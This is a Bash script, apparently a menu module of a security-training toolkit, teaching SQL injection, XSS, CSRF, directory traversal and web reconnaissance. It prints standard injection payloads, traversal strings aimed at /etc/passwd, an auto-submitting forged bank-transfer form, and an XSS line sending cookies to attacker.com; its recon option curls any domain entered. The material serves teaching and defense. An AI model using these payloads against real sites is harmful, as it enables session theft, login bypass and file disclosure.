#!/bin/bash
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; WHITE='\033[1;37m'; RESET='\033[0m'
CYBERTUZ_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LOG_DIR="$CYBERTUZ_DIR/logs"
log_action() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] WEBSEC: $1" >> "$LOG_DIR/cybertuz.log" 2>/dev/null; }
if [ -z "$CYBERTUZ_LANG" ]; then source "$CYBERTUZ_DIR/lang.sh"; ct_load_lang || _ct_set_lang "en"; fi
press_enter() { echo ""; echo -e "${YELLOW}  $CT_ENTER${RESET}"; read -r; }
header() { clear; echo -e "${RED}"; echo "  ================================================================="; echo "                  $CT_C_M5_HDR"; echo "  ================================================================="; echo -e "${RESET}"; }

sqli_tutorial() {
    header
    echo -e "${CYAN}  $CT_C_M5_SQLI${RESET}"
    echo ""
    echo -e "${WHITE}  $CT_C_M5_SQLI_DEF${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_HOW${RESET}"
    echo -e "${WHITE}  $CT_C_M5_APP_BUILD${RESET}"
    echo ""
    echo -e "${YELLOW}  $CT_C_M5_NORMAL_Q${RESET}"
    echo -e "${WHITE}  SELECT * FROM users WHERE username='john' AND password='pass'${RESET}"
    echo ""
    echo -e "${YELLOW}  $CT_C_M5_PAYLOAD_Q${RESET}"
    echo -e "${WHITE}  $CT_C_M5_USERNAME${RESET}"
    echo -e "${WHITE}  $CT_C_M5_Q_BECOMES${RESET}"
    echo -e "${RED}  SELECT * FROM users WHERE username='admin'--' AND password='...'${RESET}"
    echo -e "${WHITE}  $CT_C_M5_COMMENT${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_SQLI_TYPES${RESET}"
    echo ""
    echo -e "${YELLOW}  $CT_C_M5_INBAND${RESET}"
    echo -e "${WHITE}  $CT_C_M5_INBAND1${RESET}"
    echo -e "${WHITE}  $CT_C_M5_INBAND2${RESET}"
    echo ""
    echo -e "${YELLOW}  $CT_C_M5_BLIND${RESET}"
    echo -e "${WHITE}  $CT_C_M5_BLIND1${RESET}"
    echo -e "${WHITE}  $CT_C_M5_BLIND2${RESET}"
    echo ""
    echo -e "${YELLOW}  $CT_C_M5_OOB${RESET}"
    echo -e "${WHITE}  $CT_C_M5_OOB1${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_PAYLOADS${RESET}"
    echo -e "${WHITE}  '                    (single quote - test error)${RESET}"
    echo -e "${WHITE}  ' OR '1'='1          (always true)${RESET}"
    echo -e "${WHITE}  ' OR '1'='1'--       (comment out rest)${RESET}"
    echo -e "${WHITE}  ' UNION SELECT NULL-- (union test)${RESET}"
    echo -e "${WHITE}  1' AND SLEEP(5)--    (time-based blind)${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_PREV${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PREV1${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PREV2${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PREV3${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PREV4${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PREV5${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_SIM${RESET}"
    echo -e "${WHITE}  $CT_C_M5_SIM_TRY${RESET}"
    echo ""
    simulate_login() {
        local u="$1" p="$2"
        if [[ "$u" == "admin'--" ]] || [[ "$u" == *"' OR '1'='1"* ]] || [[ "$u" == *"--"* ]]; then
            echo -e "${RED}  $CT_C_M5_EXPLOIT${RESET}"; echo -e "${RED}  $CT_C_M5_BYPASS${RESET}"; echo -e "${WHITE}  $CT_C_M5_LOGGED_AS${RESET}"
        elif [[ "$u" == "admin" && "$p" == "password123" ]]; then
            echo -e "${GREEN}  $CT_C_M5_LOGIN_OK${RESET}"
        else
            echo -e "${WHITE}  $CT_C_M5_LOGIN_FAIL${RESET}"
        fi
    }
    echo -ne "${WHITE}  $CT_C_M5_UNAME${RESET}"; read -r sim_user
    echo -ne "${WHITE}  $CT_C_M5_PASS${RESET}"; read -r sim_pass
    echo ""; simulate_login "$sim_user" "$sim_pass"
    echo ""; echo -e "${YELLOW}  $CT_C_M5_HINT${RESET}"
    log_action "SQLi simulation tried"
    press_enter
}

xss_tutorial() {
    header
    echo -e "${CYAN}  $CT_C_M5_XSS${RESET}"
    echo ""
    echo -e "${WHITE}  $CT_C_M5_XSS_DEF${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_XSS_TYPES${RESET}"
    echo ""
    echo -e "${YELLOW}  $CT_C_M5_REFLECTED${RESET}"
    echo -e "${WHITE}  $CT_C_M5_REFLECTED_DESC${RESET}"
    echo -e "${WHITE}  URL: http://target.com/search?q=<script>alert('XSS')</script>${RESET}"
    echo -e "${WHITE}  $CT_C_M5_REFLECTED_IMPACT${RESET}"
    echo ""
    echo -e "${YELLOW}  $CT_C_M5_STORED${RESET}"
    echo -e "${WHITE}  $CT_C_M5_STORED_DESC${RESET}"
    echo -e "${WHITE}  $CT_C_M5_STORED_IMPACT${RESET}"
    echo ""
    echo -e "${YELLOW}  $CT_C_M5_DOM${RESET}"
    echo -e "${WHITE}  $CT_C_M5_DOM_DESC${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_XSS_PAYLOADS${RESET}"
    echo -e "${WHITE}  <script>alert('XSS')</script>${RESET}"
    echo -e "${WHITE}  <img src=x onerror=alert('XSS')>${RESET}"
    echo -e "${WHITE}  <svg onload=alert('XSS')>${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_COOKIE_STEAL${RESET}"
    echo -e "${WHITE}  <script>document.location='http://attacker.com/?c='+document.cookie</script>${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_XSS_PREV${RESET}"
    echo -e "${WHITE}  $CT_C_M5_XSS_P1${RESET}"
    echo -e "${WHITE}  $CT_C_M5_XSS_P2${RESET}"
    echo -e "${WHITE}  $CT_C_M5_XSS_P3${RESET}"
    echo -e "${WHITE}  $CT_C_M5_XSS_P4${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_XSS_SIM${RESET}"
    echo -ne "${WHITE}  $CT_C_M5_XSS_INPUT${RESET}"; read -r xss_input
    echo ""
    if echo "$xss_input" | grep -qiE "<script|onerror|onload|javascript:"; then
        echo -e "${RED}  $CT_C_M5_XSS_VULN${RESET}"
        echo -e "${WHITE}  $CT_C_M5_YOUR_INPUT$xss_input${RESET}"
        echo -e "${YELLOW}  $CT_C_M5_XSS_WOULD${RESET}"
    else
        echo -e "${GREEN}  $CT_C_M5_XSS_SAFE${RESET}"
        echo -e "${WHITE}  $CT_C_M5_XSS_ENCODE${RESET}"
    fi
    press_enter
}

csrf_tutorial() {
    header
    echo -e "${CYAN}  $CT_C_M5_CSRF${RESET}"
    echo ""
    echo -e "${WHITE}  $CT_C_M5_CSRF_DEF${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_CSRF_HOW${RESET}"
    echo ""
    echo -e "${WHITE}  $CT_C_M5_CSRF_S1${RESET}"
    echo -e "${WHITE}  $CT_C_M5_CSRF_S2${RESET}"
    echo -e "${WHITE}  $CT_C_M5_CSRF_S3${RESET}"
    echo ""
    echo -e "${YELLOW}  <form action='http://bank.com/transfer' method='POST'>${RESET}"
    echo -e "${YELLOW}    <input name='amount' value='1000000'>${RESET}"
    echo -e "${YELLOW}    <input name='to_account' value='hacker_account'>${RESET}"
    echo -e "${YELLOW}  </form>${RESET}"
    echo -e "${YELLOW}  <script>document.forms[0].submit();</script>${RESET}"
    echo ""
    echo -e "${WHITE}  $CT_C_M5_CSRF_S4${RESET}"
    echo -e "${WHITE}  $CT_C_M5_CSRF_S5${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_CSRF_PREV${RESET}"
    echo -e "${WHITE}  $CT_C_M5_CSRF_P1${RESET}"
    echo -e "${WHITE}  $CT_C_M5_CSRF_P2${RESET}"
    echo -e "${WHITE}  $CT_C_M5_CSRF_P3${RESET}"
    echo -e "${WHITE}  $CT_C_M5_CSRF_P4${RESET}"
    echo -e "${WHITE}  $CT_C_M5_CSRF_P5${RESET}"
    press_enter
}

directory_traversal() {
    header
    echo -e "${CYAN}  $CT_C_M5_PATH${RESET}"
    echo ""
    echo -e "${WHITE}  $CT_C_M5_PATH_DEF${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_PATH_EX${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PATH_NORMAL${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PATH_PAYLOAD${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_PATH_PAYLOADS${RESET}"
    echo -e "${WHITE}  ../../../etc/passwd${RESET}"
    echo -e "${WHITE}  ..%2F..%2F..%2Fetc%2Fpasswd (URL encoded)${RESET}"
    echo -e "${WHITE}  ..%252F..%252F..%252Fetc%252Fpasswd (double encoded)${RESET}"
    echo -e "${WHITE}  ....//....//....//etc/passwd${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_PATH_FILES${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PATH_PASSWD${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PATH_SHADOW${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PATH_HOSTS${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PATH_ENV${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PATH_LOG${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_PATH_PREV${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PATH_P1${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PATH_P2${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PATH_P3${RESET}"
    echo -e "${WHITE}  $CT_C_M5_PATH_P4${RESET}"
    press_enter
}

web_recon() {
    header
    echo -e "${CYAN}  $CT_C_M5_RECON${RESET}"
    echo ""
    echo -e "${WHITE}  $CT_C_M5_RECON_DESC${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_RECON_STEPS${RESET}"
    echo ""
    echo -e "${YELLOW}  $CT_C_M5_RECON_S1${RESET}"
    echo -e "${WHITE}  curl -I http://target.com | grep -i server${RESET}"
    echo -e "${WHITE}  whatweb http://target.com | wappalyzer${RESET}"
    echo ""
    echo -e "${YELLOW}  $CT_C_M5_RECON_S2${RESET}"
    echo -e "${WHITE}  gobuster dir -u http://target.com -w wordlist.txt${RESET}"
    echo -e "${WHITE}  ffuf -u http://target.com/FUZZ -w wordlist.txt${RESET}"
    echo ""
    echo -e "${YELLOW}  $CT_C_M5_RECON_S3${RESET}"
    echo -e "${WHITE}  curl http://target.com/robots.txt${RESET}"
    echo -e "${WHITE}  curl http://target.com/sitemap.xml${RESET}"
    echo ""
    echo -e "${GREEN}  $CT_C_M5_RECON_PRACTICE${RESET}"
    echo -ne "${WHITE}  $CT_C_M5_ENTER_DOM${RESET}"; read -r web_target
    if [[ -n "$web_target" ]]; then
        echo ""; echo -e "${CYAN}  $CT_C_M5_CHECKING_ROB${RESET}"
        curl -s --connect-timeout 5 "http://$web_target/robots.txt" 2>/dev/null | head -15 || \
        curl -s --connect-timeout 5 "https://$web_target/robots.txt" 2>/dev/null | head -15 || \
        echo -e "${RED}  $CT_C_M5_CANT_ACCESS$web_target${RESET}"
        echo ""; echo -e "${CYAN}  $CT_C_M5_CHECKING_HDR${RESET}"
        curl -I --connect-timeout 5 "https://$web_target" 2>/dev/null | head -12
        log_action "Web recon: $web_target"
    fi
    press_enter
}

while true; do
    header
    echo -e "${CYAN}  =================================================================${RESET}"
    echo -e "${WHITE}               $CT_C_M5_HDR${RESET}"
    echo -e "${CYAN}  =================================================================${RESET}"
    echo ""
    echo -e "${GREEN}  [1] $CT_M5_1${RESET}"; echo -e "${GREEN}  [2] $CT_M5_2${RESET}"
    echo -e "${GREEN}  [3] $CT_M5_3${RESET}"; echo -e "${GREEN}  [4] $CT_M5_4${RESET}"
    echo -e "${GREEN}  [5] $CT_M5_5${RESET}"; echo -e "${YELLOW}  [0] $CT_BACK${RESET}"
    echo ""
    echo -ne "${WHITE}  $CT_MPROMPT${RESET}"; read -r pilihan
    case $pilihan in
        1) sqli_tutorial ;; 2) xss_tutorial ;; 3) csrf_tutorial ;;
        4) directory_traversal ;; 5) web_recon ;;
        0) exit 0 ;; *) echo -e "${RED}  $CT_INVALID${RESET}"; sleep 1 ;;
    esac
done
